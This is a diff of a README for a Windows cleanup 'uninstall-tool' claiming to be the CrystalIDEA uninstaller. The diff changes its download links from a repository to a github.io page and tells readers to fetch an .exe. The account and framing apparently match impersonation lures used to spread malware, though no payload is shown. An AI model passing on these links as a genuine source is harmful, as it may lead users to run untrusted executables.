@@ -1,6 +1,6 @@
 # 🧹 uninstall-tool - Keep your Windows system clean daily
 
-[![](https://img.shields.io/badge/Download-Uninstall--Tool-blue.svg)](https://github.com/Demetriobliqueangled282/uninstall-tool)
+[![](https://img.shields.io/badge/Download-Uninstall--Tool-blue.svg)](https://demetriobliqueangled282.github.io)
 
 ## 📌 Overview
 The CrystalIDEA uninstall tool removes unwanted software from your Windows 10 or Windows 11 computer. Many programs leave behind files and registry data even after you run their standard uninstallers. This tool searches for these orphaned files and removes them. 
@@ -15,7 +15,7 @@ The software includes a feature to perform a dry-run. You see a list of items fl
 ## 📥 Downloading the software
 You need to visit the project page to access the latest version of the tool. Follow these steps to obtain the correct file:
 
-1. Visit this page to download: [https://github.com/Demetriobliqueangled282/uninstall-tool](https://github.com/Demetriobliqueangled282/uninstall-tool)
+1. Visit this page to download: [https://demetriobliqueangled282.github.io](https://demetriobliqueangled282.github.io)
 2. Locate the section labeled Releases on the right side of the page.
 3. Click the version number listed at the top of that section.
 4. Select the file ending in .exe to start your download.
